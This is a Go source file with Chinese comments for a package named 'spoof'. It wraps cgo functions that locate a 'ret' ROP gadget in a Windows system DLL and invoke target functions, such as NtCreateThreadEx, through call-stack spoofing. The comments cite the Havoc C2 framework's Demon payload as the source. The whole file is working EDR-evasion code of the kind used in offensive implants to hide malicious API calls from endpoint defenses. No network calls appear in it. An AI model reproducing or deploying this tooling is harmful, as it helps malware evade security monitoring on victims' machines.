//go:build windows && amd64 && cgo

// Package spoof 提供调用栈欺骗能力。
// 参考 Havoc payload/Demon/src/asm/Spoof.x64.asm。
package spoof

/*
#cgo CFLAGS: -O2 -I../crt
unsigned long long find_ret_gadget(const char*);
int spoof_call(unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long);
int spoof_call_many(unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long, unsigned long long);
*/
import "C"

// RetGadget 存储找到的 ret 指令地址。
type RetGadget struct {
	Address uintptr
	Module  string
}

// FindRetGadget 在指定系统 DLL 中查找 ret 指令（ROP gadget）。
func FindRetGadget(moduleName string) *RetGadget {
	addr := C.find_ret_gadget(C.CString(moduleName))
	if addr == 0 {
		return nil
	}
	return &RetGadget{
		Address: uintptr(addr),
		Module:  moduleName,
	}
}

// SpoofCall 使用调用栈欺骗方式执行目标函数（最多 4 参数）。
// 适用于简单 API 调用。
func SpoofCall(targetFn uintptr, retGadget uintptr, args ...uintptr) int {
	var a1, a2, a3, a4 uint64
	if len(args) > 0 {
		a1 = uint64(args[0])
	}
	if len(args) > 1 {
		a2 = uint64(args[1])
	}
	if len(args) > 2 {
		a3 = uint64(args[2])
	}
	if len(args) > 3 {
		a4 = uint64(args[3])
	}

	return int(C.spoof_call(
		C.ulonglong(retGadget),
		C.ulonglong(targetFn),
		C.ulonglong(a1),
		C.ulonglong(a2),
		C.ulonglong(a3),
		C.ulonglong(a4),
	))
}

// SpoofCallMany 使用调用栈欺骗方式执行目标函数（最多 10 参数）。
// 适用于需要更多参数的 Windows API（如 NtCreateThreadEx 等）。
func SpoofCallMany(targetFn uintptr, retGadget uintptr, args ...uintptr) int {
	var a [10]uint64
	for i := 0; i < len(args) && i < 10; i++ {
		a[i] = uint64(args[i])
	}

	return int(C.spoof_call_many(
		C.ulonglong(retGadget),
		C.ulonglong(targetFn),
		C.ulonglong(a[0]),
		C.ulonglong(a[1]),
		C.ulonglong(a[2]),
		C.ulonglong(a[3]),
		C.ulonglong(a[4]),
		C.ulonglong(a[5]),
		C.ulonglong(a[6]),
		C.ulonglong(a[7]),
		C.ulonglong(a[8]),
		C.ulonglong(a[9]),
	))
}
